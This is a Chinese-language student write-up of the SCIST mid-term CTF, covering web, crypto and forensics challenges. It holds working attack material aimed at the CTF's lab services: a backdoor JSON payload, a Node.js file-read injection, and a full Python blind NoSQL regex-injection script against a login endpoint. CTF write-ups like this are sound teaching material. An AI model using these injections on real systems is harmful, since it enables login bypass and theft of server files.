

---

# SCIST MID CTF Writeup

不要噴我拜託

---

## CATCH THE FLAG! (100 分)

**題目說明：**  
這題好像很多人打不出來?????。  
- 第一段 flag 位於主頁原始碼中。  
- 第二段 flag 則藏在 `robots.txt` 裡。

**解題過程：**  
1. 右鍵檢視主頁原始碼，使用 Ctrl+F 搜尋「SCIST」，即可快速找到第一段 flag：  
   ```
   SCIST{c0Ns01
   ```
2. 查看 `robots.txt`，會發現一行：
   ```
   Disallow:/cnZjdmN2Y3ZfYWd2Yl9kaV9jem16Cg==
   ```
   用curl進入 URL（或在網址前加上 `view-source:`）後，慢慢翻頁便可找到第二段 flag：  
   ```
   E.1O9_w3lc0mE}
   ```

---

## Real Welcome (100 分)

**題目說明：**  
直接交 flag。

**解題過程：**  
直接交 flag 即可：  
```
?????不會吧這題你還要抄答案??????
```
（「這題就填上去就行沒啥好講的」）

---

## Da Vinci Code online 🛜 (200 分)

**題目說明：**  
從 source code 入手，發現有後門機制可直接獲取答案。

**解題過程：**  
1. 分析 source code，發現以下關鍵段落：
   ```javascript
   else if (data.type === 'backdoor') {
				response = room.gameRoom.getSecretAnswer(data.command);
   }
   ```
   以及
   ```javascript
   if (command === 'SHOW_ME_THE_ANSWER_PLZ') {
			return { status: 'secret', answer: this.answer };
   }
   ```
2. 利用 Burp Suite 傳送 payload：
   ```json
   {"type":"backdoor","command":SHOW_ME_THE_ANSWER_PLZ}
   ```
   即可獲得解答：
   ```
   SCIST{WC_5c1St_Sc0r3bo4rD_1s5u3}
   ```

---

## Calculator (200 分)

**題目說明：**  
利用 Node.js 內建的檔案讀取功能直接讀取 flag 檔案。

**解題過程：**  
在 source code 中可以找到 flag 的存放位置，直接執行以下指令：
```javascript
require('fs').readFileSync('/flag_3298fh9u32niaergjfwe9ij923.txt', 'utf8')
```
執行後會得到：
```
SCIST{TRy_70_dO_5Om3_C@1cU1A7Or}
```

---

## nosql injection blind2 (367 分)

**題目說明：**  
此題利用 NoSQL 注入盲注技術，透過正則表達式逐步猜測 flag 的每個字元。

**完整程式碼：**
```python
import requests
import re

url = "http://lab.scist.org:31601/login"


flag = "SCIST{WOW_y0u_4r3_7h3_"
flag_display = flag

def test_range(current_flag, low, high):

    low_char = re.escape(chr(low))
    high_char = re.escape(chr(high))
    regex_pattern = "^" + re.escape(current_flag) + "[" + low_char + "-" + high_char + "]"
    try:
        r = requests.post(url, json={
            "username": "admin",
            "password": {"$regex": regex_pattern}
        })
        data = r.json()
    except Exception as e:
        print("請求錯誤：", e)
        return False

    # 假設伺服器回應中包含 'message' 表示匹配成功
    return 'message' in data

def find_next_char(current_flag, low_bound, high_bound):

    low = low_bound
    high = high_bound
    candidate = None

    while low <= high:
        mid = (low + high) // 2
        if test_range(current_flag, low, mid):
            candidate = mid  
            high = mid - 1   
        else:
            low = mid + 1   
    return candidate

while True:
    
    next_ord = find_next_char(flag, 32, 126)
    if next_ord is None:
        print(" ASCII 範圍內找不到，嘗試擴展搜尋範圍...")
        
        next_ord = find_next_char(flag, 127, 0x10FFFF)
        if next_ord is None:
            print("這個範圍裡面找不到")
            break

    next_char = chr(next_ord)
    flag += next_char 

    
    if ord(next_char) > 127:
        flag_display += next_char + f"(unicode:U+{ord(next_char):04X})"
    else:
        flag_display += next_char

    print("目前 flag:", flag_display)

    
    if next_char == "}":
        print("flag ：", flag_display)
        break
```

**最終結果：**  
程式執行後得到 flag：
```
SCIST{WOW_y0u_4r37h3ＢＬＩＮＤ}
```

---

## LCG cipher (339 分)

**題目說明：**  
此題利用線性同餘產生器 (LCG) 實作的流密碼。給定 71 個字節的密文，並透過已知明文「A」 (ASCII 0x41) 推導出 keystream，最後使用 XOR 解密。

**解題過程：**  
1. 將 71 個 A 字符傳送給服務端：
   ```
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   ```
2. 利用已知明文與密文計算出 keystream：
   ```
   C_known = (已知明文) XOR keystream
   keystream_byte = C_known_byte XOR 0x41
   ```
3. 逐字節進行 XOR 得到以下結果：

| 序號 | Flag 密文 | Keystream | XOR 結果                          | 字符 |
|------|-----------|-----------|-----------------------------------|------|
| 1    | 0c        | 5f        | 0x0c XOR 0x5f = 0x53              | S    |
| 2    | 2e        | 6d        | 0x2e XOR 0x6d = 0x43              | C    |
| 3    | 12        | 5b        | 0x12 XOR 0x5b = 0x49              | I    |
| 4    | 50        | 03        | 0x50 XOR 0x03 = 0x53              | S    |
| 5    | 2e        | 7a        | 0x2e XOR 0x7a = 0x54              | T    |
| 6    | cb        | b0        | 0xcb XOR 0xb0 = 0x7B              | {    |
| 7    | 5d        | 28        | 0x5d XOR 0x28 = 0x75              | u    |
| 8    | ad        | de        | 0xad XOR 0xde = 0x73              | s    |
| 9    | ae        | c7        | 0xae XOR 0xc7 = 0x69              | i    |
| 10   | 27        | 49        | 0x27 XOR 0x49 = 0x6E              | n    |
| 11   | 1a        | 7d        | 0x1a XOR 0x7d = 0x67              | g    |
| 12   | f8        | d8        | 0xf8 XOR 0xd8 = 0x20              | (空格) |
| 13   | ec        | 80        | 0xec XOR 0x80 = 0x6C              | l    |
| 14   | 12        | 7b        | 0x12 XOR 0x7b = 0x69              | i    |
| 15   | b9        | d7        | 0xb9 XOR 0xd7 = 0x6E              | n    |
| 16   | db        | be        | 0xdb XOR 0xbe = 0x65              | e    |
| 17   | e9        | 88        | 0xe9 XOR 0x88 = 0x61              | a    |
| 18   | 87        | f5        | 0x87 XOR 0xf5 = 0x72              | r    |
| 19   | af        | 8f        | 0xaf XOR 0x8f = 0x20              | (空格) |
| 20   | 0d        | 6e        | 0x0d XOR 0x6e = 0x63              | c    |
| 21   | d2        | bd        | 0xd2 XOR 0xbd = 0x6F              | o    |
| 22   | 4c        | 22        | 0x4c XOR 0x22 = 0x6E              | n    |
| 23   | ab        | cc        | 0xab XOR 0xcc = 0x67              | g    |
| 24   | 27        | 55        | 0x27 XOR 0x55 = 0x72              | r    |
| 25   | da        | af        | 0xda XOR 0xaf = 0x75              | u    |
| 26   | e9        | 8c        | 0xe9 XOR 0x8c = 0x65              | e    |
| 27   | d8        | b6        | 0xd8 XOR 0xb6 = 0x6E              | n    |
| 28   | 94        | e0        | 0x94 XOR 0xe0 = 0x74              | t    |
| 29   | 8f        | e6        | 0x8f XOR 0xe6 = 0x69              | i    |
| 30   | e7        | 86        | 0xe7 XOR 0x86 = 0x61              | a    |
| 31   | 00        | 6c        | 0x00 XOR 0x6c = 0x6C              | l    |
| 32   | aa        | 8a        | 0xaa XOR 0x8a = 0x20              | (空格) |
| 33   | 4f        | 28        | 0x4f XOR 0x28 = 0x67              | g    |
| 34   | 6e        | 0b        | 0x6e XOR 0x0b = 0x65              | e    |
| 35   | 38        | 56        | 0x38 XOR 0x56 = 0x6E              | n    |
| 36   | d2        | b7        | 0xd2 XOR 0xb7 = 0x65              | e    |
| 37   | 52        | 20        | 0x52 XOR 0x20 = 0x72              | r    |
| 38   | 47        | 26        | 0x47 XOR 0x26 = 0x61              | a    |
| 39   | 11        | 65        | 0x11 XOR 0x65 = 0x74              | t    |
| 40   | 64        | 0b        | 0x64 XOR 0x0b = 0x6F              | o    |
| 41   | 17        | 65        | 0x17 XOR 0x65 = 0x72              | r    |
| 42   | 3b        | 1b        | 0x3b XOR 0x1b = 0x20              | (空格) |
| 43   | 9b        | ef        | 0x9b XOR 0xef = 0x74              | t    |
| 44   | fd        | 92        | 0xfd XOR 0x92 = 0x6F              | o    |
| 45   | a6        | 86        | 0xa6 XOR 0x86 = 0x20              | (空格) |
| 46   | 79        | 10        | 0x79 XOR 0x10 = 0x69              | i    |
| 47   | c7        | aa        | 0xc7 XOR 0xaa = 0x6D              | m    |
| 48   | 19        | 69        | 0x19 XOR 0x69 = 0x70              | p    |
| 49   | 39        | 55        | 0x39 XOR 0x55 = 0x6C              | l    |
| 50   | 6d        | 08        | 0x6d XOR 0x08 = 0x65              | e    |
| 51   | 24        | 49        | 0x24 XOR 0x49 = 0x6D              | m    |
| 52   | 39        | 5c        | 0x39 XOR 0x5c = 0x65              | e    |
| 53   | 77        | 19        | 0x77 XOR 0x19 = 0x6E              | n    |
| 54   | 40        | 34        | 0x40 XOR 0x34 = 0x74              | t    |
| 55   | be        | 9e        | 0xbe XOR 0x9e = 0x20              | (空格) |
| 56   | 3c        | 5d        | 0x3c XOR 0x5d = 0x61              | a    |
| 57   | ae        | 8e        | 0xae XOR 0x8e = 0x20              | (空格) |
| 58   | 46        | 35        | 0x46 XOR 0x35 = 0x73              | s    |
| 59   | 8e        | fa        | 0x8e XOR 0xfa = 0x74              | t    |
| 60   | c5        | b7        | 0xc5 XOR 0xb7 = 0x72              | r    |
| 61   | c6        | a3        | 0xc6 XOR 0xa3 = 0x65              | e    |
| 62   | 63        | 02        | 0x63 XOR 0x02 = 0x61              | a    |
| 63   | 92        | ff        | 0x92 XOR 0xff = 0x6D              | m    |
| 64   | 6d        | 4d        | 0x6d XOR 0x4d = 0x20              | (空格) |
| 65   | 35        | 56        | 0x35 XOR 0x56 = 0x63              | c    |
| 66   | 16        | 7f        | 0x16 XOR 0x7f = 0x69              | i    |
| 67   | c9        | b9        | 0xc9 XOR 0xb9 = 0x70              | p    |
| 68   | 0d        | 65        | 0x0d XOR 0x65 = 0x68              | h    |
| 69   | 55        | 30        | 0x55 XOR 0x30 = 0x65              | e    |
| 70   | 59        | 2b        | 0x59 XOR 0x2b = 0x72              | r    |
| 71   | 22        | 5f        | 0x22 XOR 0x5f = 0x7d              | }    |

**最終組合後得到 flag：**  
```
SCIST{using linear congruential generator to implement a stream cipher}
```

---

## Colorful (452 分)

**題目說明：**  
這題分為兩個部分，首先需要修復一張損壞的圖片檔案，再利用彩色 QR Code 解碼工具獲取 flag。

**解題過程：**

### 1. 修復圖片檔案

1. 將檔案透過 `xxd` 轉換成 hex 格式：
   ```sh
   xxd -p colorful > colorful.hex
   ```
2. 查詢 PNG 檔案標準的檔案頭（前 8 個字節）：
   ```
   89 50 4E 47 0D 0A 1A 0A
   ```
3. 將正確的檔案頭與原始檔案的開頭互換後，利用以下指令將 hex 檔案轉回圖片：
   ```sh
   xxd -r -p colorful.hex colorful.png
   ```
   此時便可得到一張正確的 QR code 圖片（彩色）。

### 2. 解碼彩色 QR Code

1. 發現有一個工具叫做 chromaQR，把他的 decode.py 複製下來並加上以下程式碼：
   ```python
   image = Image.open("colorful_fixed.png")
   decoder = Decoder(debug=True)  
   decoded_data = decoder.decode(image)  
   print(decoded_data.decode("utf-8"))
   ```
2. 執行後會得到以下 base64 字串：
   ```
   U0NJU1R7UjNEX2FuZF82UjMzTl9hbmRfQkxVM19NNGszX000ZzFjfQ==
   ```
3. 將此字串用 base64 解碼後，得到 flag：
   ```
   SCIST{R3D_and_6R33N_and_BLU3_M4k3_M4g1c}
   ```
題外話這題其實我原本是沒有用工具的,小畫家一個一個點,後面有工具之後快多了(我無聊把這個功能加到我的discordbot,他現在可以decode和encode這個鬼圖片了歡迎用用看(
?????)

---

這次我真的超多題目都沒思路;(((((